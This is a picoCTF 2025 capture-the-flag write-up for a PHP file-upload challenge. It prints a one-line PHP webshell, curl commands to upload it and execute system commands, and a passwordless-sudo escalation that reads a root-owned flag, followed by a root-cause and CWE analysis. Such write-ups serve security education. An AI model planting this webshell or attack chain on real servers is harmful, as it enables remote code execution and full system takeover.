# n0s4n1ty 1

**Platform:** CyLab Security Academy (picoCTF), picoCTF 2025
**Category:** Web Exploitation
**Difficulty:** Easy
**Flag:** `picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}`

## Summary

A PHP/Apache profile picture uploader accepts any file extension with no server side validation
at all, allowing a plain PHP webshell to be uploaded and executed directly. From there, the
`www-data` user turns out to have unrestricted passwordless `sudo`, making full root access
trivial once code execution is achieved.

## Discovery

The upload form posts to `upload.php` with a `fileToUpload` field. Uploading a `.php` file
(even with a spoofed `image/png` content type, which turned out to be unnecessary) succeeds with
no rejection, and the response discloses the exact stored path:

```
The file shell.php has been uploaded Path: uploads/shell.php
```

Requesting the uploaded file directly executes it as PHP.

## Proof of Concept

Upload a one-line webshell:

```php
<?php system($_GET['cmd']); ?>
```

```
curl -s -F "fileToUpload=@shell.php;type=image/png" -F "submit=Upload File" \
  http://TARGET/upload.php
```

Confirm code execution:

```
curl -s "http://TARGET/uploads/shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`/root` isn't readable directly by `www-data` (`ls: cannot open directory '/root/': Permission
denied`), but checking sudo rights shows the real privilege escalation path:

```
curl -s "http://TARGET/uploads/shell.php" --data-urlencode "cmd=sudo -l 2>&1" -G
```

```
User www-data may run the following commands on challenge:
    (ALL) NOPASSWD: ALL
```

Reading the flag as root:

```
curl -s "http://TARGET/uploads/shell.php" --data-urlencode "cmd=sudo cat /root/flag.txt 2>&1" -G
```

## Root Cause

Two independent, compounding misconfigurations:

1. The upload handler performs no extension, MIME type, or content validation whatsoever, so any
   file, including server-executable PHP, is accepted and stored inside the web root.
2. The web server's own service account is granted blanket, password-free `sudo` rights,
   collapsing "got code execution as a low-privileged web user" straight into full root
   compromise with no further exploitation needed.

## CWE / OWASP

- **CWE-434**: Unrestricted Upload of File with Dangerous Type
- **CWE-250**: Execution with Unnecessary Privileges
- **OWASP A03:2021**: Injection (unrestricted file upload leading to RCE)
